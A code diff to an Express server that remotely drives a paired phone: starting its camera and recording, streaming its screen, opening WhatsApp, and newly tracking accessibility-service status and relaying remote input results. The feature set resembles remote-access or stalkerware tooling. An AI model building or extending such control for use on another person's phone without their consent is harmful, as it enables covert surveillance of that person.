@@ -59,6 +59,7 @@ try {
     paired: false,
     lastSeen: null,
     cameraActive: false,
+    accessibilityEnabled: false,
     battery: null,
     media: [],
     createdAt: new Date().toISOString()
@@ -136,6 +137,7 @@ app.get("/api/status", requireAuth, (req, res) => res.json({
   paired: !!state.paired,
   lastSeen: state.lastSeen,
   cameraActive: !!state.cameraActive,
+  accessibilityEnabled: !!state.accessibilityEnabled,
   battery: state.battery,
   mediaCount: state.media.length,
   serverTime: new Date().toISOString()
@@ -171,6 +173,7 @@ app.post("/api/device/heartbeat", requireDevice, async (req, res) => {
   state.lastSeen = new Date().toISOString();
   if (Number.isFinite(req.body?.battery)) state.battery = Math.max(0, Math.min(100, req.body.battery));
   if (typeof req.body?.cameraActive === "boolean") state.cameraActive = req.body.cameraActive;
+  if (typeof req.body?.accessibilityEnabled === "boolean") state.accessibilityEnabled = req.body.accessibilityEnabled;
   await saveState(); broadcast({ type: "status" }); res.json({ ok: true });
 });
 app.get("/api/device/commands", requireDevice, (_req, res) => {
@@ -183,7 +186,7 @@ app.post("/api/device/media", requireDevice, upload.single("file"), async (req, 
   await saveState(); broadcast({ type: "media", item }); res.json({ ok: true, item });
 });
 app.post("/api/control", requireAuth, (req, res) => {
-  const allowed = new Set(["camera_start", "camera_stop", "capture", "focus_center", "zoom", "record_start", "record_stop", "whatsapp_open", "screen_start", "screen_stop"]);
+  const allowed = new Set(["camera_start", "camera_stop", "capture", "focus_center", "zoom", "record_start", "record_stop", "whatsapp_open", "screen_start", "screen_stop", "accessibility_settings"]);
   const command = String(req.body?.command || "");
   if (!allowed.has(command)) return res.status(400).json({ error: "أمر غير مدعوم" });
   if (!state.paired) return res.status(409).json({ error: "اربط الهاتف أولاً من التطبيق" });
@@ -253,7 +256,8 @@ server.on("upgrade", (req, socket, head) => {
           try {
             const msg = JSON.parse(data.toString());
             if ((msg.type === "frame" || msg.type === "screen_frame") && typeof msg.jpeg === "string" && msg.jpeg.length < 2_000_000) broadcast({ type: "frame", source: msg.type, jpeg: msg.jpeg });
-            if (msg.type === "status") { state.lastSeen = new Date().toISOString(); state.cameraActive = !!msg.cameraActive; if (Number.isFinite(msg.battery)) state.battery = msg.battery; }
+            if (msg.type === "remote_input_result") broadcast({ type: "remote_input_result", accepted: !!msg.accepted, action: String(msg.action || ""), reason: String(msg.reason || "") });
+            if (msg.type === "status") { state.lastSeen = new Date().toISOString(); state.cameraActive = !!msg.cameraActive; if (typeof msg.accessibilityEnabled === "boolean") state.accessibilityEnabled = msg.accessibilityEnabled; if (Number.isFinite(msg.battery)) state.battery = msg.battery; saveState().catch(() => {}); }
           } catch {}
         });
         ws.on("close", () => deviceSockets.delete(ws));
